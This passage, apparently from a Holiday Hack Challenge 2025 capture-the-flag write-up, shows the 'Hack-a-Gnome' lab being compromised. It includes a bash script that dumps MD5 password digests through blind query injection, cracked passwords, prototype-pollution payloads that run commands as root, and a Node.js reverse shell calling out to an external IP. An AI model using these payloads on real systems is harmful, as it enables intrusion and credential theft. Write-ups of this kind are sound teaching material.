+  <pre class="kc-code-block kc-no-wheel"><code id="dump-digest-script" class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+BASE="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com"
+ID="b37ca0a9-643c-41e5-b682-65b187d6d820"   # &lt;-- set your id
+USER="${1:-bruce}"                          # usage: ./dump_digest.sh bruce
+MAXLEN="${2:-64}"                           # default cap, will stop early if no match
+
+HEX="0123456789abcdef"
+digest=""
+
+test_prefix() {
+  local prefix="$1"
+  local resp
+  resp=$(curl -sG "$BASE/userAvailable" \
+    --data-urlencode "username=x\" OR (c.username=\"$USER\" AND STARTSWITH(c.Digest,\"$prefix\")) OR \"y" \
+    --data-urlencode "id=$ID")
+  [[ "$resp" == *'"available":false'* ]]
+}
+
+echo "[*] Dumping Digest for user: $USER"
+for ((pos=1; pos&lt;=MAXLEN; pos++)); do
+  found=false
+  for ((i=0; i&lt;${#HEX}; i++)); do
+    ch="${HEX:i:1}"
+    prefix="${digest}${ch}"
+    if test_prefix "$prefix"; then
+      digest="$prefix"
+      echo "pos $pos =&gt; $digest"
+      found=true
+      break
+    fi
+  done
+
+  if [[ "$found" == "false" ]]; then
+    echo "[*] No matching char at position $pos, stopping."
+    break
+  fi
+done
+
+echo
+echo "Recovered Digest ($USER): $digest"</code></pre>
+</div>
+
+<!-- Kali terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">chmod +x dump_digest.sh</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">./dump_digest.sh bruce</span>
+<span class="term-kali-output">[*] Dumping Digest for user: bruce</span>
+<span class="term-kali-output">pos 1 =&gt; d</span>
+<span class="term-kali-output">pos 2 =&gt; d0</span>
+<span class="term-kali-output">pos 3 =&gt; d0a</span>
+<span class="term-kali-output">pos 4 =&gt; d0a9</span>
+<span class="term-kali-output">pos 5 =&gt; d0a9b</span>
+<span class="term-kali-output">pos 6 =&gt; d0a9ba</span>
+<span class="term-kali-output">pos 7 =&gt; d0a9ba0</span>
+<span class="term-kali-output">pos 8 =&gt; d0a9ba00</span>
+<span class="term-kali-output">pos 9 =&gt; d0a9ba00f</span>
+<span class="term-kali-output">pos 10 =&gt; d0a9ba00f8</span>
+<span class="term-kali-output">pos 11 =&gt; d0a9ba00f80</span>
+<span class="term-kali-output">pos 12 =&gt; d0a9ba00f80c</span>
+<span class="term-kali-output">pos 13 =&gt; d0a9ba00f80cb</span>
+<span class="term-kali-output">pos 14 =&gt; d0a9ba00f80cbc</span>
+<span class="term-kali-output">pos 15 =&gt; d0a9ba00f80cbc5</span>
+<span class="term-kali-output">pos 16 =&gt; d0a9ba00f80cbc56</span>
+<span class="term-kali-output">pos 17 =&gt; d0a9ba00f80cbc565</span>
+<span class="term-kali-output">pos 18 =&gt; d0a9ba00f80cbc5658</span>
+<span class="term-kali-output">pos 19 =&gt; d0a9ba00f80cbc56584</span>
+<span class="term-kali-output">pos 20 =&gt; d0a9ba00f80cbc56584e</span>
+<span class="term-kali-output">pos 21 =&gt; d0a9ba00f80cbc56584ef</span>
+<span class="term-kali-output">pos 22 =&gt; d0a9ba00f80cbc56584ef2</span>
+<span class="term-kali-output">pos 23 =&gt; d0a9ba00f80cbc56584ef24</span>
+<span class="term-kali-output">pos 24 =&gt; d0a9ba00f80cbc56584ef245</span>
+<span class="term-kali-output">pos 25 =&gt; d0a9ba00f80cbc56584ef245f</span>
+<span class="term-kali-output">pos 26 =&gt; d0a9ba00f80cbc56584ef245ff</span>
+<span class="term-kali-output">pos 27 =&gt; d0a9ba00f80cbc56584ef245ffc</span>
+<span class="term-kali-output">pos 28 =&gt; d0a9ba00f80cbc56584ef245ffc5</span>
+<span class="term-kali-output">pos 29 =&gt; d0a9ba00f80cbc56584ef245ffc56</span>
+<span class="term-kali-output">pos 30 =&gt; d0a9ba00f80cbc56584ef245ffc56b</span>
+<span class="term-kali-output">pos 31 =&gt; d0a9ba00f80cbc56584ef245ffc56b9</span>
+<span class="term-kali-output">pos 32 =&gt; d0a9ba00f80cbc56584ef245ffc56b9e</span>
+<span class="term-kali-output">[*] No matching char at position 33, stopping.</span>
+<span class="term-kali-output"></span>
+<span class="term-kali-output">Recovered Digest (bruce): d0a9ba00f80cbc56584ef245ffc56b9e</span>
+
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">./dump_digest.sh harold</span>
+<span class="term-kali-output">[*] Dumping Digest for user: harold</span>
+<span class="term-kali-output">pos 1 =&gt; 0</span>
+<span class="term-kali-output">pos 2 =&gt; 07</span>
+<span class="term-kali-output">pos 3 =&gt; 07f</span>
+<span class="term-kali-output">pos 4 =&gt; 07f4</span>
+<span class="term-kali-output">pos 5 =&gt; 07f45</span>
+<span class="term-kali-output">pos 6 =&gt; 07f456</span>
+<span class="term-kali-output">pos 7 =&gt; 07f456a</span>
+<span class="term-kali-output">pos 8 =&gt; 07f456ae</span>
+<span class="term-kali-output">pos 9 =&gt; 07f456ae6</span>
+<span class="term-kali-output">pos 10 =&gt; 07f456ae6a</span>
+<span class="term-kali-output">pos 11 =&gt; 07f456ae6a9</span>
+<span class="term-kali-output">pos 12 =&gt; 07f456ae6a94</span>
+<span class="term-kali-output">pos 13 =&gt; 07f456ae6a94c</span>
+<span class="term-kali-output">pos 14 =&gt; 07f456ae6a94cb</span>
+<span class="term-kali-output">pos 15 =&gt; 07f456ae6a94cb6</span>
+<span class="term-kali-output">pos 16 =&gt; 07f456ae6a94cb68</span>
+<span class="term-kali-output">pos 17 =&gt; 07f456ae6a94cb68d</span>
+<span class="term-kali-output">pos 18 =&gt; 07f456ae6a94cb68d7</span>
+<span class="term-kali-output">pos 19 =&gt; 07f456ae6a94cb68d74</span>
+<span class="term-kali-output">pos 20 =&gt; 07f456ae6a94cb68d740</span>
+<span class="term-kali-output">pos 21 =&gt; 07f456ae6a94cb68d740d</span>
+<span class="term-kali-output">pos 22 =&gt; 07f456ae6a94cb68d740df</span>
+<span class="term-kali-output">pos 23 =&gt; 07f456ae6a94cb68d740df5</span>
+<span class="term-kali-output">pos 24 =&gt; 07f456ae6a94cb68d740df54</span>
+<span class="term-kali-output">pos 25 =&gt; 07f456ae6a94cb68d740df548</span>
+<span class="term-kali-output">pos 26 =&gt; 07f456ae6a94cb68d740df5488</span>
+<span class="term-kali-output">pos 27 =&gt; 07f456ae6a94cb68d740df54884</span>
+<span class="term-kali-output">pos 28 =&gt; 07f456ae6a94cb68d740df548847</span>
+<span class="term-kali-output">pos 29 =&gt; 07f456ae6a94cb68d740df548847f</span>
+<span class="term-kali-output">pos 30 =&gt; 07f456ae6a94cb68d740df548847f4</span>
+<span class="term-kali-output">pos 31 =&gt; 07f456ae6a94cb68d740df548847f45</span>
+<span class="term-kali-output">pos 32 =&gt; 07f456ae6a94cb68d740df548847f459</span>
+<span class="term-kali-output">[*] No matching char at position 33, stopping.</span>
+<span class="term-kali-output"></span>
+<span class="term-kali-output">Recovered Digest (harold): 07f456ae6a94cb68d740df548847f459</span></pre>
+</div>
+
+<!-- Write-up bubble -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    These digests turned out to be plain <code>md5</code> hashes. Since they’re unsalted and relatively short,
+    an online hash-cracker can often recover the original cleartext quickly.
+  </p>
+</div>
+
+<!-- Screenshot w/ Enlarge (same pattern you used before) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="hash_recovery.png"
+      alt="Online hash cracker results recovering MD5 values"
+      class="kc-ptas-thumb"
+      data-full-src="hash_recovery.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="hash_recovery.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Hash cracking results (MD5 → recovered plaintext)</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    At this point we’ve recovered working credentials for two accounts by extracting the stored MD5 digests
+    and cracking them:
+  </p>
+
+  <ul class="kc-bullets">
+    <li><strong>bruce</strong> — <code>d0a9ba00f80cbc56584ef245ffc56b9e</code> → <code>oatmeal12</code></li>
+    <li><strong>harold</strong> — <code>07f456ae6a94cb68d740df548847f459</code> → <code>oatmeal!!</code></li>
+  </ul>
+
+  <p>
+    Logging in as <strong>bruce</strong> grants access to the <strong>Smart Gnome Control Center</strong>, confirming the
+    credentials are valid and moving us into the application’s “authenticated” functionality.
+  </p>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="smart_gnome.png"
+      alt="Smart Gnome Control Center (logged in as bruce)"
+      class="kc-ptas-thumb"
+      data-full-src="smart_gnome.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="smart_gnome.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Smart Gnome Control Center (authenticated as bruce)</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    From the Smart Gnome Control Center, we can send <strong>updated names</strong> into the Smart Gnome Statistics
+    panel. After a couple of tests, I copied the request out of the browser as a <code>curl</code> command so we can
+    bypass any UI-side filtering and make it easy to script further interactions (if needed).
+  </p>
+</div>
+
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="name_update.png"
+      alt="Copying the Update Name request as curl (ctrlsignals endpoint)"
+      class="kc-ptas-thumb"
+      data-full-src="name_update.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="name_update.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Copying the “Update Name” request as curl (ctrlsignals endpoint)</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next, I sent the <strong>name update</strong> directly with <code>curl</code>, then clicked
+    <strong>Refresh</strong> in the Smart Gnome Statistics panel to confirm the change took effect.
+    This gives us a clean, scriptable way to drive the <code>/ctrlsignals</code> endpoint without relying
+    on whatever client-side filtering the UI might apply.
+  </p>
+</div>
+
+<!-- Kali terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl</span> <span class="term-kali-string">'https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22settings%22%2C%22subkey%22%3A%22name%22%2C%22value%22%3A%22hello%22%7D'</span> \
+<span class="term-kali-flag">-X</span> <span class="term-kali-string">'GET'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Pragma: no-cache'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Accept: */*'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Sec-Fetch-Site: same-origin'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Accept-Language: en-US,en;q=0.9'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Accept-Encoding: gzip, deflate, br'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Sec-Fetch-Mode: cors'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Cache-Control: no-cache'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Referer: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/control'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Sec-Fetch-Dest: empty'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Cookie: connect.sid=s%3AvLGE2XJeE3fvGMOugHPm0Wjg1o3uyPqD.6ViEhGN2W%2FmIUrWqv%2B67TGkUDO1JOpmkNKiLwHrAtuY'</span> \
+<span class="term-kali-flag">-H</span> <span class="term-kali-string">'Priority: u=3, i'</span>
+<span class="term-kali-output">{</span><span class="term-kali-output">"type":"message","data":"success","message":"Updated settings.name to hello"}</span></pre>
+</div>
+
+<!-- Screenshot -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="name_change.png"
+      alt="Updated name reflected in the Smart Gnome Statistics panel after clicking Refresh"
+      class="kc-ptas-thumb"
+      data-full-src="name_change.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="name_change.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Updated name confirmed in the Statistics panel (after Refresh)</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Saving a couple values as variables made it easier to iterate quickly. After a few harmless tests,
+    I tried updating <code><span class="term-grep-hit">__proto__.toString</span></code>. The first request returned
+    <strong>success</strong>, but repeating the same payload triggered a server-side exception.
+  </p>
+
+  <p>
+    The stack trace references the <code>qs</code> library and
+    <code><span class="term-grep-hit">Object.prototype.toString.call is not a function</span></code> — a strong signal
+    we’ve polluted a core prototype function.
+  </p>
+</div>
+
+<!-- Kali terminal output -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-var">BASE</span>=<span class="term-kali-string">"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com"</span>
+<span class="term-kali-var">COOKIE</span>=<span class="term-kali-string">'connect.sid=s%3AvLGE2XJeE3fvGMOugHPm0Wjg1o3uyPqD.6ViEhGN2W%2FmIUrWqv%2B67TGkUDO1JOpmkNKiLwHrAtuY'</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-s</span> <span class="term-kali-flag">-G</span> <span class="term-kali-string">"$BASE/ctrlsignals"</span> \
+  <span class="term-kali-flag">--data-urlencode</span> <span class="term-kali-string">'message={"action":"update","key":"<span class="term-grep-hit">__proto__</span>","subkey":"<span class="term-grep-hit">toString</span>","value":"a"}'</span> \
+  <span class="term-kali-flag">-H</span> <span class="term-kali-string">"Cookie: $COOKIE"</span> <span class="term-kali-flag">-H</span> <span class="term-kali-string">"Accept: */*"</span>
+
+<span class="term-kali-output">{</span><span class="term-kali-output">"type":"message","data":"</span><span class="term-kali-ok">success</span><span class="term-kali-output">","message":"Updated <span class="term-grep-hit">__proto__</span>.<span class="term-grep-hit">toString</span> to a"}</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl</span> <span class="term-kali-flag">-s</span> <span class="term-kali-flag">-G</span> <span class="term-kali-string">"$BASE/ctrlsignals"</span> \
+  <span class="term-kali-flag">--data-urlencode</span> <span class="term-kali-string">'message={"action":"update","key":"<span class="term-grep-hit">__proto__</span>","subkey":"<span class="term-grep-hit">toString</span>","value":"a"}'</span> \
+  <span class="term-kali-flag">-H</span> <span class="term-kali-string">"Cookie: $COOKIE"</span> <span class="term-kali-flag">-H</span> <span class="term-kali-string">"Accept: */*"</span>
+
+<span class="term-kali-output">&lt;!DOCTYPE html&gt;</span>
+<span class="term-kali-output">&lt;html lang="en"&gt;</span>
+<span class="term-kali-output">&lt;head&gt;</span>
+<span class="term-kali-output">&lt;meta charset="utf-8"&gt;</span>
+<span class="term-kali-output">&lt;title&gt;Error&lt;/title&gt;</span>
+<span class="term-kali-output">&lt;/head&gt;</span>
+<span class="term-kali-output">&lt;body&gt;</span>
+<span class="term-kali-output term-line-focus">&lt;pre&gt;<span class="term-grep-hit">TypeError: Object.prototype.toString.call is not a function</span>&lt;br&gt;
+&nbsp;&nbsp;at Object.isRegExp (/app/node_modules/qs/lib/utils.js:231:38)&lt;br&gt;
+&nbsp;&nbsp;at normalizeParseOptions (/app/node_modules/qs/lib/parse.js:289:64)&lt;br&gt;
+&nbsp;&nbsp;at module.exports [as parse] (/app/node_modules/qs/lib/parse.js:305:19)&lt;br&gt;
+&nbsp;&nbsp;at parseExtendedQueryString (/app/node_modules/express/lib/utils.js:289:13)&lt;br&gt;
+&nbsp;&nbsp;at query (/app/node_modules/express/lib/middleware/query.js:42:19)&lt;br&gt;
+&nbsp;&nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt;
+&nbsp;&nbsp;at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)&lt;br&gt;
+&nbsp;&nbsp;at /app/node_modules/express/lib/router/index.js:286:9&lt;br&gt;
+&nbsp;&nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)&lt;br&gt;
+&nbsp;&nbsp;at next (/app/node_modules/express/lib/router/index.js:280:10)&lt;/pre&gt;</span>
+<span class="term-kali-output">&lt;/body&gt;</span>
+<span class="term-kali-output">&lt;/html&gt;</span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    This error appears to destabilize the backend session, so I started a fresh session, set the new
+    <code>connect.sid</code> cookie, and then tried a simple command-execution payload via prototype pollution.
+    The <code>curl</code> request “sets the stage”; returning to the web UI and clicking <strong>Refresh</strong>
+    on <em>Gnome Statistics</em> causes the thrown output to render in the stats pane.
+  </p>
+</div>
+
+<!-- Kali terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> COOKIE="connect.sid=s%3AnNeGFeuPCT_C2qfSHw9odXrR_lnmMIji.HqkfMz0HwayUFQ1lf6WLq3YYO3UrX9P6v6KW6tfuWuE"
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> curl -s -G "$BASE/ctrlsignals" \
+  --data-urlencode 'message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"x; const require=global.process.mainModule.require; const cp=require('\''child_process'\''); throw cp.execSync('\''id'\'').toString(); y"}' \
+  -H "Cookie: $COOKIE" -H "Accept: */*"
+
+<span class="term-kali-output">{</span><span class="term-kali-output">"type":"message","data":"</span><span class="term-kali-ok">success</span><span class="term-kali-output">","message":"Updated __proto__.outputFunctionName to x; const require=global.process.mainModule.require; const cp=require('child_process'); throw cp.execSync('id').toString(); y"}</span></pre>
+</div>
+
+<!-- Screenshot with enlarge -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="command_injection.png"
+      alt="Command injection output rendered in Smart Gnome Statistics"
+      class="kc-ptas-thumb"
+      data-full-src="command_injection.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="command_injection.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Command output rendered in the Gnome Statistics panel after Refresh</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    <strong>Excellent!</strong> We’ve confirmed <strong>RCE</strong> — the output
+    <code>uid=0(root) gid=0(root)</code> proves we’re executing commands as <strong>root</strong> inside the
+    per-gnome container. The rendering error:
+    <code>TypeError: Cannot create property 'path' on string 'uid=0(root) gid=0(root)...'</code>
+    likely means our payload worked <em>too</em> well — we threw the command output as a string, but EJS attempted
+    to treat it like an object during rendering (trying to set <code>.path</code>).
+  </p>
+
+  <p>
+    Next, I swapped <code>id</code> for a simpler <code>ls</code> to list what’s in the app directory.
+  </p>
+</div>
+
+<!-- Kali terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> curl -s -G "$BASE/ctrlsignals" \
+  --data-urlencode 'message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"x; const require=global.process.mainModule.require; const cp=require('\''child_process'\''); throw cp.execSync('\''ls'\'').toString(); y"}' \
+  -H "Cookie: $COOKIE" -H "Accept: */*"
+
+<span class="term-kali-output">{</span><span class="term-kali-output">"type":"message","data":"</span><span class="term-kali-ok">success</span><span class="term-kali-output">","message":"Updated __proto__.outputFunctionName to x; const require=global.process.mainModule.require; const cp=require('child_process'); throw cp.execSync('ls').toString(); y"}</span></pre>
+</div>
+
+<!-- Screenshot with enlarge -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Injection2.png"
+      alt="Gnome statistics panel showing ls output and EJS rendering error"
+      class="kc-ptas-thumb"
+      data-full-src="Injection2.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Injection2.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Listing the app directory via command execution (output visible in Gnome Statistics)</div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next I attempted to pivot from “command output” into an <strong>outbound callback</strong> (reverse shell style)
+    by updating the prototype-pollution payload to open a connection to an external host (details redacted for safety).
+  </p>
+
+  <p class="kc-intro">
+    The server accepted the update and the UI reflected the marker string
+    <code>SHELL_SENT</code>, indicating the injected path executed far enough to return our status value.
+  </p>
+</div>
+
+<!-- Kali terminal (redacted) -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/HACK-A-GNOME]</span>
+<span class="term-kali-prompt">└─$</span> curl -s -G "$BASE/ctrlsignals" \
+  --data-urlencode 'message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"x; const require = global.process.mainModule.require; const { spawn } = require('\''child_process'\''); const net = require('\''net'\''); const client = new net.Socket(); client.connect(443, '\''54.163.15.191'\'', () => { const sh = spawn('\''/bin/sh'\'', ['\''-i'\'']); sh.stdout.pipe(client); sh.stderr.pipe(client); client.pipe(sh.stdin); }); return '\''SHELL_SENT'\''; y"}' \
+  -H "Cookie: $COOKIE" \
+  -H "Accept: */*" \
+  -H "Referer: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/control" \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
+
+<span class="term-kali-output">{</span><span class="term-kali-output">"type":"message","data":"</span><span class="term-kali-ok">success</span><span class="term-kali-output">","message":"Updated __proto__.outputFunctionName to x; const require = global.process.mainModule.require; const { spawn } = require('child_process'); const net = require('net'); const client = new net.Socket(); client.connect(443, '54.163.15.191', () => { const sh = spawn('/bin/sh', ['-i']); sh.stdout.pipe(client); sh.stderr.pipe(client); client.pipe(sh.stdin); }); return 'SHELL_SENT'; y"}</span></pre>
+</div>
+
+<!-- Screenshot with enlarge -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="Injection3.png"
+      alt="Gnome statistics panel showing SHELL_SENT"
+      class="kc-ptas-thumb"
+      data-full-src="Injection3.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="Injection3.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Injected callback attempt: UI shows marker string <code>SHELL_SENT</code></div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    At this point, the callback successfully connected to my external host and I received an interactive shell. As they say… <strong>we’re in</strong>.
+  </p>
+</div>
+
+<!-- AWS terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--aws">
+  <div class="aws-titlebar">
+    <span class="aws-titlebar-icon">☁️</span>
+    <span class="aws-title">AWS Shell (EC2)</span>
+    <span class="aws-titlebar-buttons">
+      <span class="aws-btn aws-btn-min"></span>
+      <span class="aws-btn aws-btn-max"></span>
+      <span class="aws-btn aws-btn-close"></span>
+    </span>
+  </div>
+
+  <!-- kc-no-wheel = lets page scroll normally; user can scroll inside using the side bar -->
+  <pre class="kc-terminal-text kc-no-wheel"><code><span class="term-aws-prompt">ubuntu@ip-172-31-28-112:~$</span> <span class="term-aws-cmd">[REDACTED: listener command]</span>
+<span class="term-aws-output">Listening on 0.0.0.0 [port redacted]</span>
+<span class="term-aws-output">Connection received on [remote IP redacted] [src port redacted]</span>
+<span class="term-aws-warn">/bin/sh: 0: can't access tty; job control turned off</span>
+<span class="term-aws-root">#</span> <span class="term-aws-cmd">ls</span>
+<span class="term-aws-output">README.md</span>
+<span class="term-aws-output">canbus_client.py</span>
+<span class="term-aws-output">node_modules</span>
+<span class="term-aws-output">package-lock.json</span>
+<span class="term-aws-output">package.json</span>
+<span class="term-aws-output">server.js</span>
+<span class="term-aws-output">views</span></code></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Now that we have a shell inside the per-gnome container, the next step is to figure out why the
+    CAN controls aren’t behaving as expected. The key file here is <strong>canbus_client.py</strong>.
+  </p>
+
+  <p>
+    At a glance, the script is a simple SocketCAN sender/listener:
+  </p>
+
+  <ul>
+    <li>
+      It uses the interface <code>gcan0</code> (<code>IFACE_NAME = "gcan0"</code>).
+    </li>
+    <li>
